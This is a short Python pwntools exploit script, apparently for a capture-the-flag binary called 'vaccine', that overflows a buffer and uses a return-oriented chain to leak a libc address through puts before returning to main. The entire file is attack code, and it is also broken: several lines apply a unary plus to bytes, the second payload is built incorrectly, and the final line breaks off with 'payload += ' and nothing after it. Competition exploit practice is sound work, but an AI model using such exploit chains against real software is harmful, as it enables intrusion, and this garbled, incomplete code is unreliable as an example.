#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./vaccine')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#r = remote('vaccine.chal.ctf.acsc.asia', 1337)
r = process('./vaccine')

str="""
b* main+417
"""
#gdb.attach(r, str)

pop_rdi_ret = 0x401443
pop_rsi_ret = 0x401441
ret = 0x40101a
payload = b'A' 
payload += + b'\x00'*111
payload += b'A'
payload = payload.ljust(0x100, b'\x00')
payload += p64(0)
payload += p64(pop_rdi_ret)
payload += p64(elf.got['fopen'])
payload += p64(elf.symbols['puts'])
payload += p64(elf.symbols['main'])
r.sendline(payload)

payload = b'A' 
payload += + b'\x00'*111
payload += b'A'
payload += payload.ljust(0x100, b'\x00')
payload += p64(0)
payload += 
r.interactive()
